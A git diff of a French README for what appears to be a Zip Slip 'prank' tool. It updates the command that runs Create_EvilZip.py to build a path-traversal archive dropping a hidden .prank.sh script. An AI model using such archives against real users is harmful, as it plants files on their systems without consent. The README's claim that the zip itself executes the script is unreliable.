@@ -19,7 +19,7 @@ https://github.com/cesarsotovalero/zip-slip-exploit-example/blob/master/evilarc.
 
 vous aurez besoin de python pour executer le programme et voici comment l'utilisé :
 ```
-python Create_EvilZip.py -d 10 -o unix .prank.sh
+python3 Create_EvilZip.py -d 10 -o unix .prank.sh
 ```
 
 maintenant vous avez un zip totalement infecté, celui-ci executera donc le programme <strong>.prank.sh</strong>.
